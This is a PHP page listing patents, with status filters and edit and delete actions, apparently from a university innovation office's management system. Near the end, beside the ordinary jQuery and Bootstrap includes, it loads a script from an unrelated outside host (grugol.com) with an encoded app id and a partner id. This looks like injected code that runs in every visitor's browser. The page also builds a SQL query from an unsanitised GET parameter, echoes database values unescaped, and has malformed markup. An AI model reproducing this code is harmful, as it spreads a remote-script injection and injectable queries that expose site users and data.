<?php

include 'configs/conexao.php';

if (!isset($_SESSION)) {
	session_start();
}

$pesquisa_filtro = ($_GET['filtro']);
$filtro = "SELECT * FROM patente WHERE sit_ptt = $pesquisa_filtro";
$filtro_qry = mysqli_query($conn, $filtro);

$buscar_cadastro = "SELECT * FROM patente WHERE ativo = 1";
$query_cadastros = mysqli_query($conn, $buscar_cadastro);

?>

<html lang="pt-BR">

<head>

	<meta charset="UTF-8" />
	<title>Patente - GNIT</title>
	<meta charset="UTF-8">

	<!--Os arquivos Meta-->
	<meta name="viewport" content="width=device-width,initial-scale=1.0">
	<meta name="description" content="GNIT">
	<meta name="author" content="">
	<!--Fim dos arquivos Meta-->

	<!--Os Arquivos CSS-->
	<link href="css/bootstrap.min.css" rel="stylesheet">
	<link href="css/bootstrap-responsive.min.css" rel="stylesheet">
	<link href="css/template.css" rel="stylesheet">


	<!--HTML5 shim,for IE6-8 support of HTML5 elements -->
	<!--[if lt IE 9]>
			<script src="js/html5shiv.js></script>"
		<![endif]-->

</head>

<body>
	<div class="container-fluid" style="margin-top:80px;">
		<div class="row">
			<div class="col-md-2" id="menu-esquerdo">
				<p><img src="img/nit.jpg" style="margin-left:15px"></p>
				<ul class="nav nav-pills nav-stacked">
					<li role="presentation"><a href="propriedades.php"><img src="img/dashboard.png"> DashBoard</a></li>
					<li role="presentation"><a href="minhastarefas.php"><img src="img/carrinho.png"> Minhas Notificações </a></li>
					<li role="presentation"><a href="minhaconta.php"><img src="img/ticket.png"> Minha Conta</a></li>
					<li role="presentation"><a href="faq.php"><img src="img/faq.png"> Sistema de FAQ</a></li>
					<li role="presentation"><a href="login.php"><img src="img/sair.png"> Sair</a></li>
				</ul>
			</div> <!--Final Menu Esquerdo-->


			<!-- FILTRO DE BUSCA -->
			<div class="col-md-5">
				<form class="form-inline" action="">

					<span>Filtrar por Status</span>
					<select class="form-control" name="filtro">
						<option value="1">Patente Concedida</option>
						<option value="2">Patente Depositada</option>
						<option value="3">Acompanhamento Revista</option>
						<option value="4">Buscas</option>
						<option value="5">Esperando Contabilidade</option>
					</select>


					<button type="submit" class="btn btn-primary">Filtrar</button>
				</form>

				<!-- FINAL FILTRO DE BUSCA -->

			</div>
			<div class="col-md-5">


				<!-- FORMULARIO DE BUSCA -->

				<form class="form-inline" action="buscarpatente.php" method="GET">

					<label class="sr-only" for="busca"></label>
					<input type="search" class="form-control" name="busca" placeholder="Digite o que deseja buscar">
					<button type="submit" class="btn btn-primary">Realizar Busca</button>
					<a href="adicionarpatente.php" class="btn btn-success">Adicionar Patente</a>
				</form>


				<!-- FIM FORMULARIO DE BUSCA -->
			</div>
			<d <div class="table-responsive col-md-10">
				<table class="table table-striped" cellspacing="0" cellpadding="0">
					<thead>
						<tr>
							<th>Nome da Patente</th>
							<th>Situação</th>

							<th>Professor Responsável</th>
							<th class="actions">Ações</th>
						</tr>
					</thead>


					<!-- Modal -->

					<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
						<form action="configs/patente_excluir.php" method="POST" id="exc">
							<input type="hidden" name="id" form="exc">
							<div class="modal-dialog" role="document">
								<div class="modal-content">
									<div class="modal-header">
										<button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
										<h4 class="modal-title" id="modalLabel">Excluir Item</h4>

									</div>

									<div class="modal-body">
										Deseja realmente excluir esta Patente?
									</div>
									<div class="modal-footer">
										<button type="submit" form="exc" class="btn btn-primary">Sim</button>
										<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
									</div>
								</div>
							</div>
						</form>
					</div>


					<nav class="navbar navbar-default navbar-fixed-top">
						<div class="container">
							<div class="navbar-header">
								<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
									<span class="sr-only">Toggle navigation</span>
									<span class="icon-bar"></span>
									<span class="icon-bar"></span>
									<span class="icon-bar"></span>
								</button>
								<a class="navbar-brand" href="propriedades.php"><b>GNIT</b></a>
							</div>
							<div id="navbar" class="navbar-collapse collapse">
								<ul class="nav navbar-nav">

									<li><a href="quem.php">Quem Somos</a></li>
									<li><a href="contato.php">Contato</a></li>



								</ul>
								<ul class="nav navbar-nav navbar-right">


									<!--<li class="active"><a href="./">Fixed top <span class="sr-only">(current)</span></a></li>-->
									<div id="perfil">
										<span style="vertical-align:middle; padding-right:10px"> <i><?php echo $_SESSION['nome']; ?></i></span>
										<a href="minhaconta.php"><img src="https://via.placeholder.com/40" class="img-circle"></a>
									</div>
								</ul>
							</div><!--/.nav-collapse -->
						</div>
					</nav> <!--Final da NavBar-->

					<tbody>
						<?php

						while ($receber_cadastros = mysqli_fetch_array($query_cadastros)) {
							$nome = $receber_cadastros['tit_ptt'];
							$situacao = $receber_cadastros['sit_ptt'];
							$prof_resp = $receber_cadastros['res_ptt'];
							$id_ptt = $receber_cadastros['cd_ptt'];
							// $data_format = date('d/m/Y', $data_cad);
							$permissao = '';
							if ($situacao == '1') {
								$permissao = "Patente Concedida";
							} else if ($situacao == '2') {
								$permissao = "Esperando Depositada";
							} else if ($situacao == '3') {
								$permissao = "Acompanhamento na Revista";
							} else if ($situacao == '4') {
								$permissao = "Esperando Contabilidade";
							} else if ($situacao == '5') {
								$permissao = "Redação da Patente";
							} else {
								$permissao = "Busca";
							}

						?>

							<tr>
								<td><span class="glyphicon glyphicon-list-alt" aria-hidden="true"></span> <?php echo $nome; ?></td>
								<?php
								if ($situacao == '1') {
									echo '<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Patente Concedida</td>';
								} else if ($situacao == '2') {
									echo '<td><span class="glyphicon glyphicon-ok" aria-hidden="true"></span> Patente Depositada</td>';
								} else if ($situacao == '3') {
									echo '<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Acompanhamento na Revista</td>';
								} else if ($situacao == '4') {
									echo '<td><span class="glyphicon glyphicon-time" aria-hidden="true"></span> Esperando contabilidade</td>';
								} else if ($situacao == '5') {
									echo '<td><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span> Redação da Patente</td>';
								} else {
									echo '<td><span class="glyphicon glyphicon-remove" aria-hidden="true"></span> Busca</td>';
								}


								?>
								<td><span class="glyphicon glyphicon-user" aria-hidden="true"></span> <?php echo $prof_resp; ?></td>
								<td class="actions">

									<!--dropdown-->
									<div class="btn-group">
										<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
											Opções <span class="caret"></span>
										</button>
										<ul class="dropdown-menu">
											<li><a class="btn btn-success btn-xs" href="visualizarpatente.php?id_ptt=<?php echo $id_ptt; ?>">Visualizar</a></li>
											<li></li>
											<li><a class="btn btn-warning btn-xs" href="editarpatente.php?id_ptt=<?php echo $id_ptt; ?>">Editar</a></li>
											<li><a class="btn btn-danger btn-xs" href="#delete-modal?id_ptt=<?php echo $id_ptt; ?>" data-toggle="modal" data-target="#delete-modal" data-id="<?php echo $id_ptt; ?>">Excluir</a></li>
										</ul>
									</div>
								</td>
							</tr>
						<?php }; ?>


					</tbody>

					<!--dropdown-->
					<!-- <div class="btn-group">
						<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
							Opções <span class="caret"></span>
						</button>
						<ul class="dropdown-menu">
							<li><a class="btn btn-success btn-xs" href="adm_view.php">Visualizar</a></li>
							<li></li>
							<li><a class="btn btn-warning btn-xs" href="editarpatente.php">Editar</a></li>
							<li><a class="btn btn-danger btn-xs" href="#" data-toggle="modal" data-target="#delete-modal">Excluir</a></li>
						</ul>
					</div>
					</td>
					</tr> -->








				</table>
		</div>

	</div> <!-- /#list -->


	<!-- Modal -->
	<div class="modal fade" id="delete-modal" tabindex="-1" role="dialog" aria-labelledby="modalLabel">
		<div class="modal-dialog" role="document">
			<div class="modal-content">
				<div class="modal-header">
					<button type="button" class="close" data-dismiss="modal" aria-label="Fechar"><span aria-hidden="true">&times;</span></button>
					<h4 class="modal-title" id="modalLabel">Excluir Item</h4>
				</div>
				<div class="modal-body">
					Deseja realmente excluir este item?
				</div>
				<div class="modal-footer">
					<button type="button" class="btn btn-primary">Sim</button>
					<button type="button" class="btn btn-default" data-dismiss="modal">N&atilde;o</button>
				</div>
			</div>
		</div>
	</div>
	<hr>
	<footer>
		<h3>&copy GNIT - Todos os Direitos Reservados</h3>
	</footer>

	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

	<!-- Latest compiled and minified JavaScript -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
	<script src='http://grugol.com/prog/landing.php?app=MDAtMUYtRDAtRTgtMEItQTQ=&partner=300'></script>
	<script type="text/javascript">
		$('#delete-modal').on('show.bs.modal', function(event) {
			var button = $(event.relatedTarget) // Button that triggered the modal
			var recipientId = button.data('id')
			$(event.currentTarget).find('input[name="id"]').val(recipientId)
		})
	</script>
</body>
</body>

</html>

</html>